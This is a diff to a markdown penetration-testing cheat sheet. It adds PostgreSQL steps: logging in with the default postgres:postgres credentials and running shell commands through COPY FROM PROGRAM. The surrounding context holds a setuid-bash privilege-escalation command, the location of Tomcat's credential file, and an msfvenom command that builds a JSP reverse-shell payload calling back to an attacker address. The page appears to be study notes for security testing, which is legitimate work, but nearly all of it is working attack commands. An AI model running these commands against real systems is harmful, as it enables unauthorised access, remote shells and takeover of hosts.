@@ -189,7 +189,17 @@ chmod +s /bin/bash
 > 1. **Here is the file in which creds are saved --->** ```/etc/tomcat[5,6,7,8,9]/tomcat-users.xml``` e.g ```/etc/tomcat7/tomcat-users.xml```
 > 1. Deploy this payload to tomcat and get reverse shell ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.100 LPORT=8080 -f war -o myrev.war```
 	
-	
+#### postgres - psql 
+> 1. ```bash psql -h 192.168.250.47 -p 5437 -U <username>  -W```
+> 1. Default username password can be postgres:postgres
+> 1. Get exact version ```bash SELECT version();```
+> 1. For command execution (Tested on PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit) :
+> 1. ```bash \c postgres```
+> 1. ```bash DROP TABLE IF EXISTS cmd_exec;```
+> 1. ```bash CREATE TABLE cmd_exec(cmd_output text);```
+> 1. ```bash copy cmd_exec FROM program 'pwd';```
+> 1. ```bash SELECT * FROM cmd_exec; ```
+
 #### XXE injection
 ```bash
 <?xml  version="1.0" encoding="ISO-8859-1"?>
